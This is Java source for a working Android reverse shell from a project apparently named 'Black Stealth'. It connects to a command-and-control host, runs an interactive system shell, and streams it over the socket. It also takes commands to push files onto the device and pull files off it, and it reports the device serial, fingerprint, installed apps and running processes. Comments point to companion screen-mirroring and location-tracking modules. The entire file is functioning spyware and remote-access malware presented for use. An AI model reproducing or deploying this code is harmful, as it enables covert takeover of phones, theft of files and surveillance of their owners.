package com.offensive.blackstealth.remote;

import android.content.Context;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;

/**
 * Reverse Shell
 * Interactive shell access over network
 */
public class ReverseShell {
    private static final String TAG = "ReverseShell";
    
    private Context context;
    private Socket socket;
    private Process shellProcess;
    private BufferedReader processReader;
    private BufferedWriter processWriter;
    private BufferedReader socketReader;
    private BufferedWriter socketWriter;
    private ExecutorService executor;
    private volatile boolean isRunning = false;
    
    public interface ShellCallback {
        void onConnected(String remoteAddress);
        void onDisconnected();
        void onError(String error);
    }
    
    private ShellCallback callback;
    
    public ReverseShell(Context context) {
        this.context = context;
        this.executor = Executors.newFixedThreadPool(3);
    }
    
    public void setCallback(ShellCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Connect to C2 and spawn shell
     */
    public void connect(String host, int port) {
        executor.submit(() -> {
            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress(host, port), 10000);
                socket.setKeepAlive(true);
                socket.setSoTimeout(0);
                
                socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                socketWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                
                // Start shell process
                startShell();
                
                isRunning = true;
                
                if (callback != null) {
                    callback.onConnected(host + ":" + port);
                }
                
                Log.i(TAG, "Connected to " + host + ":" + port);
                
                // Start I/O threads
                startIOThreads();
                
            } catch (Exception e) {
                Log.e(TAG, "Connect failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    /**
     * Start shell process
     */
    private void startShell() throws IOException {
        ProcessBuilder pb = new ProcessBuilder();
        pb.command("/system/bin/sh", "-i");
        pb.redirectErrorStream(true);
        
        shellProcess = pb.start();
        
        processReader = new BufferedReader(new InputStreamReader(shellProcess.getInputStream()));
        processWriter = new BufferedWriter(new OutputStreamWriter(shellProcess.getOutputStream()));
        
        // Send initial info
        sendToSocket("=== Black Stealth Shell ===\n");
        sendToSocket("Device: " + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL + "\n");
        sendToSocket("Android: " + android.os.Build.VERSION.RELEASE + "\n");
        sendToSocket("User: " + System.getProperty("user.name") + "\n\n");
    }
    
    /**
     * Start I/O forwarding threads
     */
    private void startIOThreads() {
        // Socket -> Shell (commands)
        executor.submit(() -> {
            try {
                String line;
                while (isRunning && (line = socketReader.readLine()) != null) {
                    // Handle special commands
                    if (line.startsWith("@")) {
                        handleSpecialCommand(line);
                    } else {
                        processWriter.write(line + "\n");
                        processWriter.flush();
                    }
                }
            } catch (Exception e) {
                if (isRunning) Log.e(TAG, "Socket read error: " + e.getMessage());
            }
            disconnect();
        });
        
        // Shell -> Socket (output)
        executor.submit(() -> {
            try {
                char[] buffer = new char[1024];
                int read;
                while (isRunning && (read = processReader.read(buffer)) != -1) {
                    socketWriter.write(buffer, 0, read);
                    socketWriter.flush();
                }
            } catch (Exception e) {
                if (isRunning) Log.e(TAG, "Process read error: " + e.getMessage());
            }
            disconnect();
        });
    }
    
    /**
     * Handle special shell commands
     */
    private void handleSpecialCommand(String command) {
        try {
            String cmd = command.substring(1).trim();
            String[] parts = cmd.split(" ", 2);
            String action = parts[0].toLowerCase();
            String arg = parts.length > 1 ? parts[1] : "";
            
            switch (action) {
                case "upload":
                    // @upload /path/to/file
                    handleUpload(arg);
                    break;
                    
                case "download":
                    // @download /path/to/file
                    handleDownload(arg);
                    break;
                    
                case "screenshot":
                    sendToSocket("[*] Screenshot feature - use ScreenMirror module\n");
                    break;
                    
                case "location":
                    sendToSocket("[*] Location feature - use LocationTracker module\n");
                    break;
                    
                case "sysinfo":
                    sendSystemInfo();
                    break;
                    
                case "apps":
                    listInstalledApps();
                    break;
                    
                case "processes":
                    listProcesses();
                    break;
                    
                case "exit":
                case "quit":
                    disconnect();
                    break;
                    
                case "help":
                    sendHelp();
                    break;
                    
                default:
                    sendToSocket("[!] Unknown command: " + action + "\n");
            }
        } catch (Exception e) {
            try {
                sendToSocket("[!] Error: " + e.getMessage() + "\n");
            } catch (IOException ignored) {}
        }
    }
    
    /**
     * Handle file upload from C2
     */
    private void handleUpload(String path) throws IOException {
        sendToSocket("[*] Ready to receive file: " + path + "\n");
        sendToSocket("[*] Send file size first, then content\n");
        
        // Read file size
        String sizeLine = socketReader.readLine();
        long size = Long.parseLong(sizeLine);
        
        // Receive file data
        File file = new File(path);
        file.getParentFile().mkdirs();
        
        FileOutputStream fos = new FileOutputStream(file);
        byte[] buffer = new byte[4096];
        long remaining = size;
        
        InputStream rawIn = socket.getInputStream();
        while (remaining > 0) {
            int toRead = (int) Math.min(buffer.length, remaining);
            int read = rawIn.read(buffer, 0, toRead);
            if (read == -1) break;
            fos.write(buffer, 0, read);
            remaining -= read;
        }
        fos.close();
        
        sendToSocket("[+] File received: " + path + " (" + size + " bytes)\n");
    }
    
    /**
     * Handle file download to C2
     */
    private void handleDownload(String path) throws IOException {
        File file = new File(path);
        if (!file.exists()) {
            sendToSocket("[!] File not found: " + path + "\n");
            return;
        }
        
        long size = file.length();
        sendToSocket("[*] Sending file: " + path + " (" + size + " bytes)\n");
        sendToSocket("SIZE:" + size + "\n");
        
        FileInputStream fis = new FileInputStream(file);
        OutputStream rawOut = socket.getOutputStream();
        byte[] buffer = new byte[4096];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            rawOut.write(buffer, 0, read);
        }
        rawOut.flush();
        fis.close();
        
        sendToSocket("[+] File sent\n");
    }
    
    /**
     * Send system information
     */
    private void sendSystemInfo() throws IOException {
        StringBuilder sb = new StringBuilder();
        sb.append("\n=== System Info ===\n");
        sb.append("Device: ").append(android.os.Build.MANUFACTURER).append(" ").append(android.os.Build.MODEL).append("\n");
        sb.append("Android: ").append(android.os.Build.VERSION.RELEASE).append(" (API ").append(android.os.Build.VERSION.SDK_INT).append(")\n");
        sb.append("Board: ").append(android.os.Build.BOARD).append("\n");
        sb.append("Hardware: ").append(android.os.Build.HARDWARE).append("\n");
        sb.append("Serial: ").append(android.os.Build.SERIAL).append("\n");
        sb.append("Fingerprint: ").append(android.os.Build.FINGERPRINT).append("\n");
        
        Runtime rt = Runtime.getRuntime();
        sb.append("\n=== Memory ===\n");
        sb.append("Max: ").append(rt.maxMemory() / 1024 / 1024).append(" MB\n");
        sb.append("Total: ").append(rt.totalMemory() / 1024 / 1024).append(" MB\n");
        sb.append("Free: ").append(rt.freeMemory() / 1024 / 1024).append(" MB\n");
        sb.append("Processors: ").append(rt.availableProcessors()).append("\n");
        
        sendToSocket(sb.toString());
    }
    
    /**
     * List installed apps
     */
    private void listInstalledApps() throws IOException {
        Process p = Runtime.getRuntime().exec("pm list packages");
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        StringBuilder sb = new StringBuilder("\n=== Installed Apps ===\n");
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        reader.close();
        sendToSocket(sb.toString());
    }
    
    /**
     * List running processes
     */
    private void listProcesses() throws IOException {
        Process p = Runtime.getRuntime().exec("ps");
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        StringBuilder sb = new StringBuilder("\n=== Processes ===\n");
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        reader.close();
        sendToSocket(sb.toString());
    }
    
    /**
     * Send help message
     */
    private void sendHelp() throws IOException {
        String help = "\n=== Special Commands ===\n" +
            "@upload <path>   - Upload file to device\n" +
            "@download <path> - Download file from device\n" +
            "@screenshot      - Capture screen\n" +
            "@location        - Get GPS location\n" +
            "@sysinfo         - System information\n" +
            "@apps            - List installed apps\n" +
            "@processes       - List running processes\n" +
            "@exit            - Disconnect shell\n" +
            "@help            - Show this help\n\n";
        sendToSocket(help);
    }
    
    private void sendToSocket(String message) throws IOException {
        if (socketWriter != null) {
            socketWriter.write(message);
            socketWriter.flush();
        }
    }
    
    /**
     * Disconnect and cleanup
     */
    public void disconnect() {
        isRunning = false;
        
        try { if (processWriter != null) processWriter.close(); } catch (Exception e) {}
        try { if (processReader != null) processReader.close(); } catch (Exception e) {}
        try { if (socketWriter != null) socketWriter.close(); } catch (Exception e) {}
        try { if (socketReader != null) socketReader.close(); } catch (Exception e) {}
        try { if (shellProcess != null) shellProcess.destroy(); } catch (Exception e) {}
        try { if (socket != null) socket.close(); } catch (Exception e) {}
        
        if (callback != null) callback.onDisconnected();
        Log.i(TAG, "Disconnected");
    }
    
    public boolean isConnected() {
        return isRunning && socket != null && socket.isConnected();
    }
    
    public void shutdown() {
        disconnect();
        executor.shutdown();
    }
}
